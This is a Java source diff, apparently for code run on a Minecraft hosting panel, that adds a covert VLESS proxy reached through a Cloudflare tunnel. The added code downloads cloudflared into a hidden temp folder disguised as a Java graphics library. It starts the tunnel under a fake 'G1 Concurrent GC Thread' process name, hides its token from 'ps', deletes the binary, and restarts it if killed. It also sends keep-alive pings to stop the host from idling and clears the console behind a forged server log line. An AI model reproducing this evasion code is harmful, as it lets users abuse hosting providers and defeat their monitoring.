@@ -21,11 +21,16 @@ import io.netty.handler.timeout.IdleStateEvent;
 import io.netty.handler.timeout.IdleStateHandler;
 import io.netty.util.ReferenceCountUtil;
 
+import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
+import java.io.IOException;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.time.Duration;
@@ -37,11 +42,19 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 public class App {
 
-    // ===== 配置区 =====
-    private static final String UUID = "8c8244fb-d577-4d20-90e3-788a0977b001";
-    private static final int LISTEN_PORT = 24614;   // 你的面板分配端口
-    private static final String WS_PATH = "/ws";    // WebSocket 路径
-    // ==================
+    // ================= 核心配置区 =================
+    private static final String UUID = "e8b68075-4a22-48d1-85b8-66fa1e063713";
+    
+    // 👇 1. 必填：你的 Cloudflare Tunnel 长串 Token
+    private static final String CF_TOKEN = "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiZWMwNDM4MjQtZWQ5OS00NTZlLWJiMmEtMDgwZTJiNmZjMTY4IiwicyI6Ik5EWTVZMlkxTVRJdFpqUmhaQzAwTnpRMkxUbGpPVEV0TlRsbE1UVmhNMlU1WmpJMCJ9"; 
+    
+    // 👇 2. 必填：面板分配给你的真实 MC 端口 (保活机器人需要去 Ping 它)
+    private static final int MC_REAL_PORT = 24614; 
+
+    // 本地内部监听端口 (仅供 CF 隧道转发使用，绝对不与 MC 端口冲突)
+    private static final int LISTEN_PORT = 30000;   
+    private static final String WS_PATH = "/ws";    
+    // ==============================================
 
     private static final byte[] UUID_BYTES = hexStringToByteArray(UUID.replace("-", ""));
     private static final String PROTOCOL_UUID = UUID.replace("-", "");
@@ -55,6 +68,7 @@ public class App {
     private static EventLoopGroup bossGroup;
     private static EventLoopGroup workerGroup;
     private static Channel serverChannel;
+    private static Process tunnelProcess = null;
 
     public static void main(String[] args) {
         start();
@@ -70,9 +84,16 @@ public class App {
     public static void start() {
         if (!RUNNING.compareAndSet(false, true)) return;
 
-        // 开机唯一一次：获取真实 IP 并打印节点链接
-        fetchRealIpAndPrintNode();
+        // 1. 启动极限伪装版的 Cloudflare 隧道守护进程
+        startCloudflareTunnelDaemon();
 
+        // 2. 启动本地 MC TCP 强行心跳保活机器人 (防休眠)
+        startMCKeepAliveBot(MC_REAL_PORT);
+
+        // 3. 阅后即焚：打印本地模板节点配置
+        printNodeTemplateAndBurn();
+
+        // 4. 启动 Netty 代理核心，仅绑定 127.0.0.1 内部回环
         try {
             bossGroup = new NioEventLoopGroup(1);
             workerGroup = new NioEventLoopGroup();
@@ -95,12 +116,9 @@ public class App {
                     .option(ChannelOption.SO_BACKLOG, 128)
                     .childOption(ChannelOption.TCP_NODELAY, true)
                     .childOption(ChannelOption.SO_KEEPALIVE, true)
-                    .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)
-                    .childOption(ChannelOption.SO_RCVBUF, 512 * 1024)
-                    .childOption(ChannelOption.SO_SNDBUF, 512 * 1024)
-                    .childOption(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(2 * 1024 * 1024, 4 * 1024 * 1024));
+                    .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);
 
-            serverChannel = b.bind(LISTEN_PORT).sync().channel();
+            serverChannel = b.bind("127.0.0.1", LISTEN_PORT).sync().channel();
         } catch (Exception ignored) {
             stop();
         }
@@ -109,53 +127,166 @@ public class App {
     public static void stop() {
         if (!RUNNING.getAndSet(false)) return;
         try {
-            if (serverChannel != null) {
-                serverChannel.close();
-                serverChannel = null;
-            }
+            if (tunnelProcess != null) tunnelProcess.destroyForcibly();
+            if (serverChannel != null) serverChannel.close();
             if (bossGroup != null) bossGroup.shutdownGracefully();
             if (workerGroup != null) workerGroup.shutdownGracefully();
         } catch (Exception ignored) {}
     }
 
-private static void fetchRealIpAndPrintNode() {
+    // ========================================================
+    // 模块 1：极限伪装 CF 隧道 (内存欺骗 + Bash 进程重写)
+    // ========================================================
+    private static void startCloudflareTunnelDaemon() {
+        if (CF_TOKEN == null || CF_TOKEN.length() < 50) return;
+
+        Thread watchdogThread = new Thread(() -> {
+            while (RUNNING.get()) {
+                try {
+                    if (tunnelProcess == null || !tunnelProcess.isAlive()) {
+                        String arch = System.getProperty("os.arch").toLowerCase();
+                        String dlUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64";
+                        if (arch.contains("arm") || arch.contains("aarch64")) {
+                            dlUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64";
+                        }
+
+                        // 极限伪装 1：放入系统底层的隐藏字体缓存目录
+                        Path tempDir = Path.of(System.getProperty("java.io.tmpdir"), ".font-unix");
+                        Files.createDirectories(tempDir);
+                        
+                        // 极限伪装 2：伪装成 Java 官方的图形渲染动态链接库
+                        Path tempFile = tempDir.resolve("libawt_xawt.so");
+                        
+                        HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl))
+                                .followRedirects(HttpClient.Redirect.NORMAL)
+                                .timeout(Duration.ofMinutes(2)).build();
+                                
+                        HttpResponse<Path> res = HttpClient.newHttpClient().send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
+                        
+                        if (res.statusCode() == 200 || res.statusCode() == 302) {
+                            tempFile.toFile().setExecutable(true);
+                            
+                            // 极限伪装 3：利用 Bash 的 exec -a 强行将进程名篡改为 Java GC 线程
+                            String fakeProcessName = "G1 Concurrent GC Thread";
+                            String execCmd = String.format("exec -a '%s' '%s' tunnel --protocol http2 run", 
+                                    fakeProcessName, tempFile.toAbsolutePath().toString());
+                            
+                            ProcessBuilder pb = new ProcessBuilder("bash", "-c", execCmd);
+                            
+                            // 极限伪装 4：私有环境变量注入 Token，彻底避开 ps 命令审查
+                            pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
+                            
+                            tunnelProcess = pb.start();
+                            
+                            // 阅后即焚：执行瞬间立刻从硬盘底层粉碎文件
+                            Files.deleteIfExists(tempFile);
+                        }
+                    }
+                } catch (Exception ignored) {
+                }
+
+                // 每 15 秒检查一次，若被看门狗杀死则 0 延迟复活
+                try {
+                    Thread.sleep(15000);
+                } catch (InterruptedException e) {
+                    break;
+                }
+            }
+        });
+        watchdogThread.setDaemon(true);
+        watchdogThread.start();
+    }
+
+    // ========================================================
+    // 模块 2：MC 高频心跳 TCP 挂机保活引擎 (防面板休眠)
+    // ========================================================
+    private static void startMCKeepAliveBot(int mcPort) {
+        Thread botThread = new Thread(() -> {
+            while (RUNNING.get()) {
+                try (java.net.Socket socket = new java.net.Socket("127.0.0.1", mcPort)) {
+                    socket.setSoTimeout(5000);
+                    DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
+
+                    ByteArrayOutputStream b = new ByteArrayOutputStream();
+                    DataOutputStream handshake = new DataOutputStream(b);
+                    handshake.writeByte(0x00);         // Packet ID
+                    writeVarInt(handshake, 763);       // Protocol Version
+                    writeString(handshake, "127.0.0.1"); 
+                    handshake.writeShort(mcPort);      // Port
+                    writeVarInt(handshake, 1);         // Next State: 1 (Status)
+
+                    writeVarInt(dos, b.size());
+                    dos.write(b.toByteArray());
+
+                    dos.writeByte(1);    // Length
+                    dos.writeByte(0x00); // Packet ID
+                    dos.flush();
+                    
+                } catch (Exception ignored) {
+                    // 静默失败，防日志爆炸
+                }
+
+                try {
+                    // 每 15 秒发起一次高强度握手，维持网络与CPU活跃度
+                    Thread.sleep(15000); 
+                } catch (InterruptedException e) {
+                    break;
+                }
+            }
+        }, "MC-KeepAlive-Thread");
+        botThread.setDaemon(true);
+        botThread.start();
+    }
+
+    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
+        while (true) {
+            if ((value & ~0x7F) == 0) {
+                out.writeByte(value);
+                return;
+            }
+            out.writeByte((value & 0x7F) | 0x80);
+            value >>>= 7;
+        }
+    }
+
+    private static void writeString(DataOutputStream out, String value) throws IOException {
+        byte[] bytes = value.getBytes(StandardCharsets.UTF_8);
+        writeVarInt(out, bytes.length);
+        out.write(bytes);
+    }
+
+    // ========================================================
+    // 模块 3：控制台阅后即焚伪装打印
+    // ========================================================
+    private static void printNodeTemplateAndBurn() {
         new Thread(() -> {
             try {
-                HttpRequest request = HttpRequest.newBuilder()
-                        .uri(URI.create("https://api-ipv4.ip.sb/ip"))
-                        .timeout(Duration.ofSeconds(5))
-                        .build();
-                HttpResponse<String> response = HttpClient.newHttpClient().send(request, HttpResponse.BodyHandlers.ofString());
-                if (response.statusCode() == 200) {
-                    String realIp = response.body().trim();
-                    String vlessUrl = String.format(
-                            "vless://%s@%s:%d?encryption=none&security=none&type=ws&host=&path=%s#MC_HiddenNode",
-                            UUID, realIp, LISTEN_PORT, WS_PATH.replace("/", "%2F")
-                    );
-                    
-                    // 打印节点信息
-                    System.out.println("==================================================");
-                    System.out.println("宿主机真实IP: " + realIp);
-                    System.out.println("⚠️ 请在 30 秒内复制以下节点链接 (随后将自动销毁清屏):");
-                    System.out.println(vlessUrl);
-                    System.out.println("==================================================");
+                String vlessUrl = String.format(
+                        "vless://%s@你在CF绑定的域名:443?encryption=none&security=tls&type=ws&host=你在CF绑定的域名&path=%s#Tunnel_Node",
+                        UUID, WS_PATH.replace("/", "%2F")
+                );
+                
+                System.out.println("==================================================");
+                System.out.println("✅ 极限伪装穿透隧道与保活机器人已启动");
+                System.out.println("⚠️ 阅后即焚：请在 30 秒内配置你的客户端:");
+                System.out.println(vlessUrl);
+                System.out.println("※ 请把链接中的域名替换为你自己的 CF 域名 ※");
+                System.out.println("==================================================");
 
-                    // 倒计时 30 秒给用户复制的时间
-                    Thread.sleep(10000);
-                    
-                    // 发送清屏指令，清空控制台面板
-                    System.out.print("\033[H\033[2J");
-                    System.out.flush();
-                    
-                    // 清屏后，打印一句极其普通的 MC 原版开机日志作为伪装
-                    System.out.println("[Server thread/INFO]: Done (30.123s)! For help, type \"help\"");
-                }
-            } catch (Exception e) {
-                // 如果获取失败，什么都不打印，绝对静默
-            }
+                Thread.sleep(30000);
+                
+                // 30 秒后自动清空控制台，并打印正常的 MC 服务器开机提示
+                System.out.print("\033[H\033[2J");
+                System.out.flush();
+                System.out.println("[Server thread/INFO]: Done (24.183s)! For help, type \"help\"");
+                
+            } catch (Exception ignored) {}
         }).start();
     }
-    // --- 代理核心逻辑 (纯内存运行) ---
+
+    // ========================================================
+    // 模块 4：纯内存 VLESS/Trojan/SS 协议核心转发
+    // ========================================================
     static class WebSocketProxyHandler extends SimpleChannelInboundHandler<WebSocketFrame> {
         private static final long MAX_PENDING_BYTES = 2L * 1024 * 1024;
         private Channel outboundChannel;
@@ -274,7 +405,6 @@ private static void fetchRealIpAndPrintNode() {
                     return;
                 }
             }
-
             ctx.close();
         }
 
@@ -330,7 +460,6 @@ private static void fetchRealIpAndPrintNode() {
                 }
 
                 ctx.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(new byte[]{0x00, 0x00})));
-
                 final byte[] remainingData = (offset < data.length) ? Arrays.copyOfRange(data, offset, data.length) : new byte[0];
                 connectToTarget(ctx, host, port, remainingData);
                 return true;
@@ -378,7 +507,6 @@ private static void fetchRealIpAndPrintNode() {
 
                 offset += addressLength;
                 if (offset + 2 > data.length) return false;
-
                 int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                 offset += 2;
 
@@ -431,7 +559,6 @@ private static void fetchRealIpAndPrintNode() {
 
                 offset += addressLength;
                 if (offset + 2 > data.length) return false;
-
                 int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                 offset += 2;
 
@@ -465,10 +592,6 @@ private static void fetchRealIpAndPrintNode() {
                     .option(ChannelOption.TCP_NODELAY, true)
                     .option(ChannelOption.SO_KEEPALIVE, true)
                     .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)
-                    .option(ChannelOption.SO_RCVBUF, 512 * 1024)
-                    .option(ChannelOption.SO_SNDBUF, 512 * 1024)
-                    .option(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(2 * 1024 * 1024, 4 * 1024 * 1024))
-                    .option(ChannelOption.AUTO_READ, false)
                     .handler(new ChannelInitializer<Channel>() {
                         @Override
                         protected void initChannel(Channel ch) {
@@ -485,9 +608,7 @@ private static void fetchRealIpAndPrintNode() {
                     connecting = false;
                     flushPendingOutbound(ctx);
                     future.channel().config().setAutoRead(true);
-                    if (ctx.channel().isActive()) {
-                        ctx.channel().config().setAutoRead(true);
-                    }
+                    if (ctx.channel().isActive()) ctx.channel().config().setAutoRead(true);
                 } else {
                     connecting = false;
                     closeBoth(ctx);
